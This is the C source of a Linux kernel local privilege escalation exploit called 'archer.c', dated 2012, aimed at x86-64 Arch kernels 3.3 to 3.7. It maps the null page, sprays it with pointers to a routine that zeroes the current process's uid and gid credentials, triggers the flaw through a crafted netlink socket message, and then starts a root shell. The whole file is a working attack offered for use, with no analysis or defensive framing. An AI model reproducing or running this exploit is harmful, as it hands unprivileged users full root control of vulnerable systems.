// archer.c
//
// 2012 sd@fucksheep.org
//
// Works reliably against x86-64 3.3-3.7 arch.
//
// Tested against:
//
// Linux XXX 3.3.1-1-ARCH #1 SMP PREEMPT Tue Apr 3 06:46:17 UTC 2012 x86_64 GNU/Linux
// Linux XXX 3.4.7-1-ARCH #1 SMP PREEMPT Sun Jul 29 22:02:56 CEST 2012 x86_64 GNU/Linux
// Linux XXX 3.7.4-1-ARCH #1 SMP PREEMPT Mon Jan 21 23:05:29 CET 2013 x86_64 GNU/Linux
// ...

#include <assert.h>

#define JUMP  0x0000100000001000LL
#define BASE  0x380000000
#define SIZE  0x010000000
#define KSIZE  0x2000000

static long ugid;

void patch_current() {
        int i,j,k;
        char *current = *(char**)(((long)&i) & (-8192));
        long kbase = ((long)current)>>36;

        for (i=0; i<4000; i+=4) {
                long *p = (void *)&current[i];
                int *t = (void*) p[0];
                if ((p[0] != p[1]) || ((p[0]>>36) != kbase)) continue;
                for (j=0; j<20; j++) {
      for (k = 0; k < 8; k++)
                          if (((int*)&ugid)[k%2] != t[j+k]) goto next;
                        for (i = 0; i < 8; i++) t[j+i] = 0;
                        for (i = 0; i < 10; i++) t[j+9+i] = -1;
                        return;
next:;          }
        }
}


int main()
{
  long u = getuid();
  long g = getgid();
  int i, f = socket(16,3,4);
  static int n[10] = {40,0x10014,0,0,45,-1};

  assert(mmap((void*)(1<<12), 1<<20, 3, 0x32, 0, 0)!=-1);

  setresuid(u,u,u); setresgid(g,g,g);
  ugid = (g<<32)|u;

  memcpy(1<<12, &patch_current, 1024);
  for (i = 0; i < (1<<17); i++) ((void**)(1<<12))[i] = &patch_current;
  send(f, n, sizeof(n), 0);
  setuid(0);
  return execl("/bin/bash", "-sh", 0);
}